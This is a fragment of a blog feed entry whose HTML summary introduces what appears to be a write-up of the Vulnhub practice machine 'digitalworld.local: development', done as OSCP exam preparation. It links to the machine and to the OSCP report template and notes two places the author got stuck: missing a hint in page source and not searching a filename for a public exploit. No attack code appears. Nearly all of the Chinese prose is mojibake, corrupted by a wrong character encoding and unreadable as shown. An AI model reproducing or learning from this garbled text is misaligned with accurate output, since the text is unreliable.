    <summary type="html">&lt;p&gt;ä¸´è¿‘  OSCP Examäº†ï¼Œåšç‚¹ Vulnhub çš„é¶æœºç»ƒç»ƒæ‰‹ï¼Œé¡ºä¾¿ä¹Ÿç»ƒç»ƒ Report çš„ç¼–å†™ã€‚&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;é¶æœºåœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&quot;&gt;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt; &lt;strong&gt;stuck:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1ã€å…³é”®æ—¶å€™ã€‚ã€‚å¿˜äº†æŸ¥çœ‹ç½‘é¡µæºä»£ç ã€‚å…³çœ‹æç¤ºçš„å­—å»äº†ï¼Œçœ‹äº†æ”»ç•¥æ‰å‘ç°è—åœ¨ç½‘é¡µæºä»£ç é‡Œã€‚ã€‚ã€‚çŠ¯äº†ä½çº§é”™è¯¯ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;2ã€ç½‘é¡µæŠ¥é”™çš„æ—¶å€™ï¼Œæ²¡æœ‰æƒ³åˆ°å»æœç´¢æ–‡ä»¶åã€‚çœ‹äº†æ”»ç•¥æ‰å‘ç°ç™¾åº¦èƒ½æœåˆ°ç›¸å…³çš„ exploit&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;OSCP Exam Report çš„æ¨¡æ¿åœ¨æ­¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&quot;&gt;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;ç”±äº Report ä¸­åªæœ‰ç¬¬ä¸‰èŠ‚æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥æœ¬èŠ‚å°±ç›´æ¥ä»¿ç…§ç¬¬ä¸‰èŠ‚æ¥å†™äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
</feed>
